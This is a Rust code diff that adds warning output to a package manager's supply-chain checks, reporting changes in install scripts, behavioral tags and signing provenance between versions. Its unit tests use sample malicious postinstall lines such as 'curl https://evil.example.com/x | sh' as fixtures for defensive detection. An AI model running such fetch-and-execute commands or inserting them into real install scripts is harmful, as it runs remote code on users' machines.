@@ -400,6 +400,305 @@ pub fn compute_version_diff(
     }
 }
 
+// ═══════════════════════════════════════════════════════════════════
+//  Rendering layer
+// ═══════════════════════════════════════════════════════════════════
+//
+// Pure text rendering — no I/O, no stdout writes. Callers (install.rs,
+// approve_builds.rs) pass already-collected script-body snapshots and
+// get back an `Option<String>` to emit however they route output
+// (stderr vs stdout, `output::warn` vs `println!`, JSON vs human).
+//
+// Split into two entry points matching §11 P7's two render sites:
+//   * [`render_terse_hint`]   — 1–2 line summary for the install
+//     blocked-set warning. Omits unified diffs. Agents and humans
+//     should both read this as "there's drift, run approve-builds
+//     for details."
+//   * [`render_preflight_card`] — fuller card for the autoBuild path
+//     and the approve-builds TUI. Includes a unified script-body diff
+//     via [`diffy`] when both store bodies are available; degrades
+//     to a terse notice when the prior is absent from the store.
+
+/// Snapshot of install-phase script bodies for one `name@version`.
+///
+/// Produced by reading the store with
+/// [`crate::build_state::read_install_phase_bodies`] and converted to
+/// a `HashMap<phase, body>` for lookup by [`render_preflight_card`].
+/// Callers typically build this on the install path (where the store
+/// is already open) and pass it in by reference so the renderer
+/// stays pure.
+pub type PhaseBodies = std::collections::BTreeMap<String, String>;
+
+/// Ingest `Vec<(String, String)>` output from
+/// [`crate::build_state::read_install_phase_bodies`] into a
+/// `BTreeMap` keyed by phase name. `BTreeMap` (not `HashMap`) so
+/// render output is deterministic across runs — callers that print
+/// phase-by-phase should see the same order every time.
+pub fn phase_bodies_from_pairs(pairs: Vec<(String, String)>) -> PhaseBodies {
+    pairs.into_iter().collect()
+}
+
+/// Render a 1–2 line human-readable hint describing `diff`.
+///
+/// Returns `None` when [`VersionDiff::is_drift`] is false — callers
+/// can `if let Some(line) = ...` without a sentinel check.
+///
+/// Format is TERSE: the diff card full content lives in
+/// [`render_preflight_card`]; this function is what the post-install
+/// banner appends per-package so the user gets "there's drift on
+/// these N packages" visibility before entering `lpm approve-builds`.
+///
+/// Examples (leading two-space indent matches the existing
+/// [`crate::commands::approve_builds::print_package_card`] layout so
+/// the rendered hint composes cleanly with the broader warning
+/// block):
+///
+/// ```text
+///   esbuild@0.25.2 — script content changed since v0.25.1
+///   axios@1.14.1  — provenance dropped since v1.14.0 (axios-pattern signal)
+///   pkg@2.0.0     — behavioral tags +network, +eval since v1.0.0
+///   pkg@2.0.0     — script + tags changed since v1.0.0 (see approve-builds)
+/// ```
+pub fn render_terse_hint(diff: &VersionDiff, package_name: &str) -> Option<String> {
+    if !diff.is_drift() {
+        return None;
+    }
+    let head = format!("  {}@{} — ", package_name, diff.candidate_version);
+    let since = format!(" since v{}", diff.prior_version);
+    let body = match &diff.reason {
+        VersionDiffReason::NoChange => return None,
+        VersionDiffReason::ScriptHashDrift => format!("script content changed{since}"),
+        VersionDiffReason::BehavioralTagShift { gained, lost } => {
+            format!("behavioral tags {}{since}", tag_delta_suffix(gained, lost))
+        }
+        VersionDiffReason::ProvenanceDrift { kind } => render_provenance_terse(kind, &since),
+        VersionDiffReason::MultiFieldDrift {
+            script_hash,
+            tags,
+            provenance,
+        } => {
+            let mut dims: Vec<&'static str> = Vec::new();
+            if *script_hash {
+                dims.push("script");
+            }
+            if tags.is_some() {
+                dims.push("tags");
+            }
+            if provenance.is_some() {
+                dims.push("provenance");
+            }
+            format!("{} changed{since}", dims.join(" + "))
+        }
+    };
+    Some(format!("{head}{body}"))
+}
+
+fn render_provenance_terse(kind: &ProvenanceDriftKind, since: &str) -> String {
+    match kind {
+        ProvenanceDriftKind::IdentityChanged => {
+            format!("provenance identity changed{since}")
+        }
+        ProvenanceDriftKind::Dropped => {
+            format!("provenance dropped{since} (axios-pattern signal)")
+        }
+        ProvenanceDriftKind::Gained => format!("provenance gained{since}"),
+    }
+}
+
+fn tag_delta_suffix(gained: &[String], lost: &[String]) -> String {
+    let mut parts: Vec<String> = Vec::new();
+    for t in gained {
+        parts.push(format!("+{t}"));
+    }
+    for t in lost {
+        parts.push(format!("-{t}"));
+    }
+    if parts.is_empty() {
+        // The diff core guarantees at least one delta when it returns
+        // `BehavioralTagShift`; `Vec::new()` here would be a bug
+        // upstream, not a valid render. Fall back to a neutral label
+        // rather than panicking in a display path.
+        "changed".into()
+    } else {
+        parts.join(", ")
+    }
+}
+
+/// Render a multi-line "changes since v<prior>" card — the fuller
+/// view used by (a) the install auto-build preflight (before any
+/// green's scripts execute) and (b) the approve-builds TUI (C3).
+///
+/// Returns `None` when [`VersionDiff::is_drift`] is false.
+///
+/// Inputs:
+/// - `diff` — the classified diff value.
+/// - `package_name` — rendered in the header.
+/// - `prior_scripts` — `Some` iff the prior version is still in the
+///   store. When `None`, the renderer degrades the script-body
+///   section to a terse "(prior not in store)" note rather than
+///   producing a spurious diff. The behavioral-tag and provenance
+///   sections are unaffected by store availability.
+/// - `candidate_scripts` — same shape for the candidate.
+///
+/// The script-body section uses [`diffy`]'s `Patch` + `PatchFormatter`
+/// to produce a GNU-patch-style unified diff, the same format the
+/// `lpm patch` infrastructure produces. Per-phase cards are emitted
+/// in `EXECUTED_INSTALL_PHASES` order (preinstall → install →
+/// postinstall) so output is deterministic.
+pub fn render_preflight_card(
+    diff: &VersionDiff,
+    package_name: &str,
+    prior_scripts: Option<&PhaseBodies>,
+    candidate_scripts: Option<&PhaseBodies>,
+) -> Option<String> {
+    if !diff.is_drift() {
+        return None;
+    }
+
+    let mut out = String::new();
+    out.push_str(&format!(
+        "  {}@{} — changes since v{}:\n",
+        package_name, diff.candidate_version, diff.prior_version
+    ));
+
+    // Helper closures over the three dimension renderings so the
+    // single-variant and multi-variant branches share one code path.
+    let render_script = |out: &mut String, label: bool| {
+        if label {
+            out.push_str("    Script content changed:\n");
+        }
+        let body = render_script_body_diff(prior_scripts, candidate_scripts);
+        // Indent the diff two extra spaces so it nests inside the card.
+        for line in body.lines() {
+            out.push_str("      ");
+            out.push_str(line);
+            out.push('\n');
+        }
+    };
+
+    let render_tags = |out: &mut String, shift: &TagShift| {
+        out.push_str("    Behavioral tags:\n");
+        for t in &shift.gained {
+            out.push_str(&format!("      + {t}\n"));
+        }
+        for t in &shift.lost {
+            out.push_str(&format!("      - {t}\n"));
+        }
+    };
+
+    let render_prov = |out: &mut String, kind: &ProvenanceDriftKind| {
+        let line = match kind {
+            ProvenanceDriftKind::IdentityChanged => "    Provenance identity changed.",
+            ProvenanceDriftKind::Dropped => {
+                "    Provenance dropped — previously-signed publisher, this version unsigned (axios-pattern signal)."
+            }
+            ProvenanceDriftKind::Gained => "    Provenance gained — this version is newly signed.",
+        };
+        out.push_str(line);
+        out.push('\n');
+    };
+
+    match &diff.reason {
+        VersionDiffReason::NoChange => return None,
+        VersionDiffReason::ScriptHashDrift => render_script(&mut out, false),
+        VersionDiffReason::BehavioralTagShift { gained, lost } => {
+            let shift = TagShift {
+                gained: gained.clone(),
+                lost: lost.clone(),
+            };
+            render_tags(&mut out, &shift);
+        }
+        VersionDiffReason::ProvenanceDrift { kind } => render_prov(&mut out, kind),
+        VersionDiffReason::MultiFieldDrift {
+            script_hash,
+            tags,
+            provenance,
+        } => {
+            if *script_hash {
+                render_script(&mut out, true);
+            }
+            if let Some(shift) = tags {
+                render_tags(&mut out, shift);
+            }
+            if let Some(kind) = provenance {
+                render_prov(&mut out, kind);
+            }
+        }
+    }
+
+    Some(out.trim_end().to_string())
+}
+
+/// Render the script-body diff section of a preflight card.
+///
+/// If either side is `None` (prior or candidate not readable from the
+/// store), degrades to a one-line "(prior/candidate not in store —
+/// unified diff unavailable; script hash differs)" note. Store
+/// absence is the common degradation, not a bug: `lpm cache clean`
+/// or a fresh clone can evict the prior version.
+///
+/// When both sides are present, iterates
+/// [`lpm_security::EXECUTED_INSTALL_PHASES`] and emits a per-phase
+/// unified diff header + body via [`diffy`]. Only phases that
+/// differ between the two sides are emitted so a change in only
+/// `postinstall` doesn't also dump `install` and `preinstall` as
+/// no-op diffs.
+fn render_script_body_diff(prior: Option<&PhaseBodies>, candidate: Option<&PhaseBodies>) -> String {
+    let (prior, candidate) = match (prior, candidate) {
+        (Some(p), Some(c)) => (p, c),
+        _ => {
+            return "(prior or candidate scripts not in store — unified diff \
+                unavailable; script hash differs)"
+                .into();
+        }
+    };
+
+    let formatter = diffy::PatchFormatter::new();
+    let mut out = String::new();
+    for phase in lpm_security::EXECUTED_INSTALL_PHASES {
+        let p = prior.get(*phase).map(String::as_str).unwrap_or("");
+        let c = candidate.get(*phase).map(String::as_str).unwrap_or("");
+        if p == c {
+            continue;
+        }
+
+        // Ensure both sides end with a trailing newline so diffy's
+        // line-by-line patch format doesn't attribute a "\ No
+        // newline at end of file" marker to a phase that just has a
+        // single shell command without a trailing \n.
+        let p_norm = ensure_trailing_newline(p);
+        let c_norm = ensure_trailing_newline(c);
+
+        out.push_str(&format!("--- scripts.{phase} (v<prior>)\n"));
+        out.push_str(&format!("+++ scripts.{phase} (v<candidate>)\n"));
+        let patch = diffy::create_patch(&p_norm, &c_norm);
+        out.push_str(&formatter.fmt_patch(&patch).to_string());
+        out.push('\n');
+    }
+    if out.is_empty() {
+        // All phases equal — shouldn't happen when reason ==
+        // ScriptHashDrift, but degrade gracefully rather than emit
+        // an empty card.
+        "(script hash differs but per-phase bodies compare equal — possible \
+         key-ordering drift in package.json; run `lpm build` for verbose \
+         output)"
+            .into()
+    } else {
+        out.trim_end().to_string()
+    }
+}
+
+fn ensure_trailing_newline(s: &str) -> String {
+    if s.ends_with('\n') {
+        s.to_string()
+    } else {
+        let mut out = String::with_capacity(s.len() + 1);
+        out.push_str(s);
+        out.push('\n');
+        out
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -923,5 +1222,238 @@ mod tests {
 
         let td = TrustedDependencies::Legacy(vec!["axios".into()]);
         assert!(td.latest_binding_for_name("axios", "1.0.0").is_none());
+    }
+
+    // ─── Rendering layer — terse hints ────────────────────────────
+
+    fn mk_diff(reason: VersionDiffReason) -> VersionDiff {
+        VersionDiff {
+            prior_version: "1.0.0".into(),
+            candidate_version: "2.0.0".into(),
+            reason,
+        }
+    }
+
+    #[test]
+    fn terse_hint_returns_none_for_no_change() {
+        let diff = mk_diff(VersionDiffReason::NoChange);
+        assert!(render_terse_hint(&diff, "pkg").is_none());
+    }
+
+    #[test]
+    fn terse_hint_script_hash_drift() {
+        let diff = mk_diff(VersionDiffReason::ScriptHashDrift);
+        let line = render_terse_hint(&diff, "esbuild").unwrap();
+        assert_eq!(
+            line,
+            "  esbuild@2.0.0 — script content changed since v1.0.0"
+        );
+    }
+
+    #[test]
+    fn terse_hint_behavioral_tag_gained_surfaces_delta() {
+        // Ship criterion 2, terse rendering: the gained tags MUST
+        // appear verbatim in the install output so the user sees
+        // "+network +eval" without running approve-builds.
+        let diff = mk_diff(VersionDiffReason::BehavioralTagShift {
+            gained: vec!["eval".into(), "network".into()],
+            lost: vec![],
+        });
+        let line = render_terse_hint(&diff, "suspicious").unwrap();
+        assert!(
+            line.contains("+network"),
+            "+network must appear in terse hint — got {line}"
+        );
+        assert!(
+            line.contains("+eval"),
+            "+eval must appear in terse hint — got {line}"
+        );
+        assert!(line.contains("since v1.0.0"));
+    }
+
+    #[test]
+    fn terse_hint_behavioral_tag_both_gained_and_lost() {
+        let diff = mk_diff(VersionDiffReason::BehavioralTagShift {
+            gained: vec!["network".into()],
+            lost: vec!["crypto".into()],
+        });
+        let line = render_terse_hint(&diff, "mixed").unwrap();
+        assert!(line.contains("+network"));
+        assert!(line.contains("-crypto"));
+    }
+
+    #[test]
+    fn terse_hint_provenance_dropped_names_axios_pattern() {
+        // "axios-pattern signal" is a load-bearing phrase in the doc:
+        // it's the recognizable shorthand ops teams can grep on.
+        let diff = mk_diff(VersionDiffReason::ProvenanceDrift {
+            kind: ProvenanceDriftKind::Dropped,
+        });
+        let line = render_terse_hint(&diff, "axios").unwrap();
+        assert!(line.contains("provenance dropped"));
+        assert!(line.contains("axios-pattern"));
+    }
+
+    #[test]
+    fn terse_hint_provenance_identity_changed() {
+        let diff = mk_diff(VersionDiffReason::ProvenanceDrift {
+            kind: ProvenanceDriftKind::IdentityChanged,
+        });
+        let line = render_terse_hint(&diff, "pkg").unwrap();
+        assert!(line.contains("provenance identity changed"));
+    }
+
+    #[test]
+    fn terse_hint_multi_field_drift_lists_dimensions() {
+        let diff = mk_diff(VersionDiffReason::MultiFieldDrift {
+            script_hash: true,
+            tags: Some(TagShift {
+                gained: vec!["network".into()],
+                lost: vec![],
+            }),
+            provenance: Some(ProvenanceDriftKind::Dropped),
+        });
+        let line = render_terse_hint(&diff, "compromise").unwrap();
+        assert!(line.contains("script + tags + provenance changed"));
+        assert!(line.contains("since v1.0.0"));
+    }
+
+    // ─── Rendering layer — preflight card ────────────────────────
+
+    fn bodies(pairs: &[(&str, &str)]) -> PhaseBodies {
+        pairs
+            .iter()
+            .map(|(k, v)| (k.to_string(), v.to_string()))
+            .collect()
+    }
+
+    #[test]
+    fn preflight_card_returns_none_for_no_change() {
+        let diff = mk_diff(VersionDiffReason::NoChange);
+        assert!(render_preflight_card(&diff, "pkg", None, None).is_none());
+    }
+
+    #[test]
+    fn preflight_card_script_hash_drift_renders_unified_diff() {
+        // Ship criterion 1: "the exact added line before any execution."
+        // Prior postinstall is `echo hi`; candidate adds `curl X | sh`
+        // after it. The unified diff must surface the added line.
+        let prior = bodies(&[("postinstall", "echo hi\n")]);
+        let candidate = bodies(&[(
+            "postinstall",
+            "echo hi\ncurl https://evil.example.com/x | sh\n",
+        )]);
+        let diff = mk_diff(VersionDiffReason::ScriptHashDrift);
+        let card = render_preflight_card(&diff, "evil", Some(&prior), Some(&candidate)).unwrap();
+
+        assert!(card.contains("evil@2.0.0 — changes since v1.0.0:"));
+        assert!(
+            card.contains("+curl https://evil.example.com/x | sh"),
+            "the exact added line must appear in the card — got:\n{card}"
+        );
+        // Unified-diff headers should identify the phase so the
+        // reviewer can see WHICH phase drifted.
+        assert!(card.contains("scripts.postinstall"));
+    }
+
+    #[test]
+    fn preflight_card_script_drift_degrades_when_prior_missing_from_store() {
+        // Common `lpm cache clean` scenario: the prior tarball was
+        // evicted. Card must degrade gracefully rather than crash or
+        // emit a misleading empty diff.
+        let candidate = bodies(&[("postinstall", "node build.js\n")]);
+        let diff = mk_diff(VersionDiffReason::ScriptHashDrift);
+        let card = render_preflight_card(&diff, "pkg", None, Some(&candidate)).unwrap();
+        assert!(card.contains("prior or candidate scripts not in store"));
+    }
+
+    #[test]
+    fn preflight_card_behavioral_tag_section_shows_gained_and_lost() {
+        let diff = mk_diff(VersionDiffReason::BehavioralTagShift {
+            gained: vec!["eval".into(), "network".into()],
+            lost: vec!["crypto".into()],
+        });
+        let card = render_preflight_card(&diff, "pkg", None, None).unwrap();
+        // Deterministic order: gained then lost, each block in the
+        // order provided (which is sorted ascending).
+        let eval_pos = card.find("+ eval").expect("+ eval missing");
+        let network_pos = card.find("+ network").expect("+ network missing");
+        let crypto_pos = card.find("- crypto").expect("- crypto missing");
+        assert!(eval_pos < network_pos);
+        assert!(network_pos < crypto_pos);
+    }
+
+    #[test]
+    fn preflight_card_provenance_dropped_section() {
+        let diff = mk_diff(VersionDiffReason::ProvenanceDrift {
+            kind: ProvenanceDriftKind::Dropped,
+        });
+        let card = render_preflight_card(&diff, "axios", None, None).unwrap();
+        assert!(card.contains("Provenance dropped"));
+        assert!(card.contains("axios-pattern signal"));
+    }
+
+    #[test]
+    fn preflight_card_multi_field_renders_each_dimension() {
+        let prior = bodies(&[("postinstall", "echo safe\n")]);
+        let candidate = bodies(&[("postinstall", "echo safe\ncurl evil.example | sh\n")]);
+        let diff = mk_diff(VersionDiffReason::MultiFieldDrift {
+            script_hash: true,
+            tags: Some(TagShift {
+                gained: vec!["eval".into()],
+                lost: vec![],
+            }),
+            provenance: Some(ProvenanceDriftKind::Dropped),
+        });
+        let card =
+            render_preflight_card(&diff, "compromise", Some(&prior), Some(&candidate)).unwrap();
+
+        // All three dimensions must appear.
+        assert!(card.contains("Script content changed"));
+        assert!(card.contains("+curl evil.example | sh"));
+        assert!(card.contains("+ eval"));
+        assert!(card.contains("Provenance dropped"));
+    }
+
+    #[test]
+    fn preflight_card_only_diffs_changed_phases() {
+        // A package with drift in postinstall but identical install
+        // and preinstall should only emit a unified-diff section for
+        // postinstall — no empty `--- / +++` headers for equal
+        // phases.
+        let prior = bodies(&[
+            ("preinstall", "echo pre\n"),
+            ("install", "echo in\n"),
+            ("postinstall", "echo post\n"),
+        ]);
+        let candidate = bodies(&[
+            ("preinstall", "echo pre\n"),
+            ("install", "echo in\n"),
+            ("postinstall", "echo post\ncurl X | sh\n"),
+        ]);
+        let diff = mk_diff(VersionDiffReason::ScriptHashDrift);
+        let card = render_preflight_card(&diff, "partial", Some(&prior), Some(&candidate)).unwrap();
+
+        assert!(card.contains("scripts.postinstall"));
+        assert!(
+            !card.contains("scripts.preinstall"),
+            "preinstall is unchanged; its header must NOT appear — got:\n{card}"
+        );
+        assert!(
+            !card.contains("scripts.install (v"),
+            "install is unchanged; its header must NOT appear — got:\n{card}"
+        );
+    }
+
+    #[test]
+    fn phase_bodies_from_pairs_preserves_all_entries() {
+        let pairs = vec![
+            ("postinstall".to_string(), "cmd-a".to_string()),
+            ("preinstall".to_string(), "cmd-b".to_string()),
+        ];
+        let map = phase_bodies_from_pairs(pairs);
+        assert_eq!(map.get("postinstall").map(String::as_str), Some("cmd-a"));
+        assert_eq!(map.get("preinstall").map(String::as_str), Some("cmd-b"));
+        assert_eq!(map.len(), 2);
     }
 }
